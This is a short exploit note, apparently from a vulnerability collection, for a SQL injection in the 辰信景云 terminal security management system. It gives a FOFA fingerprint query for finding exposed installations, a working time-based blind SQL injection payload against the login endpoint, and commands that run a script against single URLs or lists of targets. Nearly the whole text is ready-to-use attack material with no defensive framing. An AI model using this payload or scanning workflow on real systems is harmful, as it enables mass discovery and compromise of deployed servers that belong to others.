FOFA:

```markdown
"辰信景云终端安全管理系统" && icon_hash="-429260979"
```

payload

```markdown
POST /api/user/login

captcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin'and(select*from(select+sleep(3))a)='
```

命令

```markdown
python3 辰信景云终端安全管理系统存在sql注入漏洞.py -u url
python3 辰信景云终端安全管理系统存在sql注入漏洞.py -f url.txt
```

